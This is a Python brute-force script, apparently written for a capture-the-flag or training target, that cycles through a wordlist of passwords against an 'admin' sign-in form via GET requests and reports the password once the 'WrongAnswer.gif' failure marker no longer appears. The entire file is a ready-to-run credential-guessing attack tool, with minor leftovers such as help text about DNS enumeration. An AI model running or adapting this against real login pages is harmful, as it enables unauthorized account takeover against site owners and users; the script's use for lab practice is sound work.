#!/bin/python3

import requests
import argparse
from urllib.parse import urljoin
from signal import signal, SIGINT

YELLOW = "\033[1;33m"
RED = "\033[91m"
GREEN = "\033[92m"
END = "\033[0m"

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.usage = "./brute_force.py [-hw] URL"
    parser.add_argument("-w", "--wordlist", required=True, help="indicates the wordlist file to use for DNS enumeration.")
    parser.add_argument("URL", help="URL to enum")
    return (parser.parse_args())

def check_password(url, password: str):
    data = f"?page=signin&username=admin&password={password}&Login=Login"
    full_url = urljoin(url, data)
    return requests.get(full_url)

def signalHandler(signum, _):
	if signum == SIGINT:
		print("")
		exit(0)

def getWordlist(arg: str) -> list:
    try:
        with open(arg) as file:
            wordlist: list = file.read().splitlines()
    except:
        print(f"{YELLOW}\nCannot open file: {arg}{END}\n")
        exit(1)	
    return wordlist

def brute_force(url: str, wordlist: list):
    i = 0
    try:
        for password in wordlist:
            response = check_password(url, password)
            if "images/WrongAnswer.gif" not in response.text:
                print(f"{GREEN}Password found: {password}{END}")
                break
            i += 1
            print(f"{i} requests")
    except FileNotFoundError:
        print(f"{RED}No dictionary file provided.{END}")

if __name__ == "__main__":
    signal(SIGINT, signalHandler)
    args = parse_arguments()
    url = args.URL
    wordlist = getWordlist(args.wordlist)
    brute_force(url, wordlist)
